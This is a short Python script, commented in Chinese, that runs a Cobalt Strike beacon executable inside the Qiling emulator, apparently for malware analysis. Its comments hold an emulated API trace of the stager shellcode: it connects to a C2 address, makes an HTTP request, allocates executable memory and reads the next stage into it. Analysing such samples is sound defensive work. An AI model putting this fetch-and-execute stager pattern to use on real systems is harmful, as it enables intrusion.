# 脚本路径
# D:\workspace\qiling\examples\qiling_test.py

# 仿真CobaltStrike的shellcode

# Stager 
# [=]     InternetOpenA(lpszAgent = 0, dwAccessType = 0, lpszProxy = 0, lpszProxyBypass = 0, dwFlags = 0)
# [=]     InternetConnectA(hInternet = 0x180768a50, lpszServerName = "10.1.3.55", nServerPort = 0x50, lpszUserName = 0, lpszPassword = 0, dwService = 0x3, dwFlags = 0, dwContext = 0)
# [=]     HttpOpenRequestA(hConnect = 0x18087c2c0, lpszVerb = 0, lpszObjectName = "/lz6A", lpszVersion = 0, lpszReferrer = 0, lplpszAcceptTypes = 0, dwFlags = 0x84400200, dwContext = 0)
# [=]     HttpSendRequestA(hRequest = 0x1808ad370, lpszHeaders = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n", dwHeadersLength = 0xffffffff, lpOptional = 0, dwOptionalLength = 0x400001d6) = 0x1
# [=]     VirtualAlloc(lpAddress = 0, dwSize = 0x400000, flAllocationType = 0x1000, flProtect = 0x40) = 0x500000ea8
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500000ea8, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500001d50, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500002bf8, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500003aa0, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500004948, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x5000057f0, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500006698, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500007540, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x5000083e8, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500009290, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000a138, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000afe0, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000be88, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000cd30, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000dbd8, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000ea80, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x50000f928, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x5000107d0, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500011678, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500012520, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x5000133c8, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500014270, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500015118, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1
# [=]     InternetReadFile(hFile = 0x1808ad370, lpBuffer = 0x500015fc0, dwNumberOfBytesToRead = 0x2000, lpdwNumberOfBytesRead = 0x80000001dec0) = 0x1

# StagerLess
# 是一个很大的exe

from qiling import Qiling
from qiling.const import QL_ARCH, QL_OS, QL_VERBOSE
from unicorn.x86_const import *
from colorama import Fore,Back,Style,init



# 目前会在sprintf出现异常,估计是没实现
init(wrap=True, autoreset=True)
ql = Qiling([r'rootfs/x8664_windows/beacon_x64.exe'], rootfs=r"rootfs/x8664_windows",archtype=QL_ARCH.X8664,ostype=QL_OS.WINDOWS,verbose=QL_VERBOSE.DEFAULT)
ql.run()
